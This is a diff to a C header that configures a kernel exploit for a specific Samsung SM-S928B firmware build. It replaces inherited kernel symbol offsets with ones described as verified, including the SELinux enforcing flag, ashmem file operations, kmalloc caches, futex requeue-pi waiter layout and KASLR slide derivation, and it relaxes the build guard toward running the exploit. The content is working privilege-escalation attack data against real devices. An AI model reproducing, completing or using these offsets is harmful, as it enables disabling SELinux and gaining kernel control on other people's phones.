@@ -2,10 +2,17 @@
  * SM-S928B / S928BXXU6EZIF port.
  *
  * Identity fields are measured on the reference SM-S928B unit.
- * SLIDE_TRACEFS_WORKER_CALLER_OFF is verified against the live tracefs
- * sched_blocked_reason caller. The remaining symbol offsets are inherited from
- * the SM-S928N EZIF profile on the same KMI build and are NOT yet verified
- * against the S928BXXU6EZIF Image; p0_fingerprint.h has not been generated.
+ * Every symbol offset below is checked against the Image shipped in
+ * S928BXXU6EZIF (38,140,416 bytes, sha256 a8c1638497ca1bff576c5a6d9426521e
+ * c545fd68da8ce5dfa47c40233391a179): each entry resolves to its kallsyms
+ * symbol at base+offset, or to an object whose contents point at the
+ * documented target.  p0_fingerprint.h is generated from the same Image at
+ * P0_ORACLE_PROBE_OFFSET.  SLIDE_PSELECT_WORD_SHIFT comes from this Image's
+ * futex/pselect frames (see ezif_layout.h).
+ *
+ * P0_KERNEL_PHYS_LOAD is still an inherited candidate with no offline proof:
+ * /proc/iomem and /proc/cmdline are denied to the shell and the BL archive
+ * exposes no matching literal.
  *
  * The offline gate in docs/PORT-STATUS.md must pass before this profile is
  * built or run. The build is hard-blocked below until then.
@@ -13,7 +20,7 @@
 #include "ezif_layout.h"
 
 #if !defined(ALLOW_UNVERIFIED_S928B)
-#error "e3q-S928BXXU6EZIF: symbol offsets and P0 fingerprint are not verified yet. See docs/PORT-STATUS.md."
+#error "e3q-S928BXXU6EZIF: P0_KERNEL_PHYS_LOAD is unproven on this build. See docs/PORT-STATUS.md."
 #endif
 
 /* Fail closed before any exploit attempt if the live phone differs.
@@ -114,8 +121,11 @@
  * second copy at the address corresponding to the same fake_fops pointer. */
 #define APP_EZIF_FOPS_TABLE_ALT_OFF 0x2180
 
-/* Inherited: the SM-S928N BTF confirms these waiter/task field offsets.
- * Confirm against the S928BXXU6EZIF BTF before the first write. */
+/* Waiter field offsets are confirmed by this Image's BTF (rt_mutex_waiter is
+ * 0x58 bytes with tree_entry at 0x0, pi_tree_entry at 0x18, task at 0x30, lock
+ * at 0x38, wake_state at 0x40, prio at 0x44, deadline at 0x48, ww_ctx at 0x50)
+ * and by the RB_CLEAR_NODE self-stores in futex_wait_requeue_pi.  The
+ * task_struct fields are confirmed in the same BTF. */
 #define SLIDE_SYNC_PSELECT_SYSCALL 0
 #define SLIDE_GUARD_PSELECT_SYSCALL 0
 #define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
@@ -166,18 +176,23 @@
 /* Verified on the SM-S928B reference unit without root. The live
  * sched_blocked_reason text trace reports caller=worker_thread+0xa0/0x430; the
  * raw ring buffer gives 0xffffffc0081cb39c for that event, and
- * 0xdb39c + 0xf0000 slide lands exactly on it (64 KiB aligned). */
+ * 0xdb39c + 0xf0000 slide lands exactly on it (64 KiB aligned).
+ * Image side: worker_thread (0xdb2fc) + 0x9c is `bl schedule`, so 0xdb39c is
+ * that call's return address and the offset names the same frame. */
 #undef SLIDE_TRACEFS_WORKER_CALLER_OFF
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db39cULL
 
 #undef SLIDE_S928_PROBE_TARGET_IMAGE_OFF
 #define SLIDE_S928_PROBE_TARGET_IMAGE_OFF 0x023dc200ULL
 
-/* ---- inherited symbol offsets: NOT verified on S928BXXU6EZIF ----
- * These are the SM-S928N EZIF values. This build shares the same KMI build id
- * (34343818) and the worker caller above matched exactly, but every entry here
- * still needs re-derivation from the S928BXXU6EZIF Image. */
+/* ---- symbol offsets checked against the S928BXXU6EZIF Image ----
+ * Each value is either a kallsyms entry at base+offset or the address of an
+ * object whose contents resolve to the documented target.  docs/DELTA.md
+ * records the per-row evidence.  Recheck after any firmware change: a shared
+ * KMI build id does not imply an identical layout. */
 #undef ASHMEM_MISC_FOPS_OFF
+/* ashmem_miscs (base+0x023dc1f0) + 0x10, the miscdevice .fops field; it holds
+ * base+0x013e2e30. */
 #define ASHMEM_MISC_FOPS_OFF 0x023dc200ULL
 #undef ASHMEM_FOPS_OFF
 #define ASHMEM_FOPS_OFF 0x013e2e30ULL
@@ -198,6 +213,7 @@
 #undef CONFIGFS_BIN_WRITE_ITER_OFF
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x004730b4ULL
 #undef COPY_SPLICE_READ_OFF
+/* generic_file_splice_read; the macro name is inherited from the reference. */
 #define COPY_SPLICE_READ_OFF 0x003f07c4ULL
 #undef NOOP_LLSEEK_OFF
 #define NOOP_LLSEEK_OFF 0x003a235cULL
@@ -206,6 +222,7 @@
 #undef ROOT_TASK_GROUP_OFF
 #define ROOT_TASK_GROUP_OFF 0x0246dd80ULL
 #undef SELINUX_ENFORCING_OFF
+/* selinux_state, in .bss; the enforcing byte is its first field. */
 #define SELINUX_ENFORCING_OFF 0x02542618ULL
 #undef KMALLOC_CACHES_OFF
 #define KMALLOC_CACHES_OFF 0x01781458ULL
@@ -218,15 +235,21 @@
 #define SYSTEM_UNBOUND_WQ_OFF 0x0225ac60ULL
 
 #undef SLIDE_NFULNL_LOGGER_OFF
-#define SLIDE_NFULNL_LOGGER_OFF 0x016ba44fULL
+/* nfulnl_logger.name holds base+0x16ba45d, where "nfnetlink_log" starts.  The
+ * inherited 0x16ba44f pointed into the preceding "packet message\n" string, so
+ * slide_read_stext returned real_stext+14 and every slide failed the 32 KiB
+ * alignment check. */
+#define SLIDE_NFULNL_LOGGER_OFF 0x016ba45dULL
 #undef SLIDE_LOGGERS_0_1_OFF
+/* nfulnl_logger itself. */
 #define SLIDE_LOGGERS_0_1_OFF 0x02262828ULL
 #undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
+/* random_table[0x108].data, holding base+0x02625768 (&sysctl_bootid). */
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02396a98ULL
 #undef SLIDE_SYSCTL_BOOTID_OFF
 #define SLIDE_SYSCTL_BOOTID_OFF 0x02625768ULL
 
-/* Aliases for the inherited EZIF symbol offsets above. */
+/* Aliases for the symbol offsets above. */
 #undef ASHMEM_MISC_FOPS
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #undef ASHMEM_FOPS
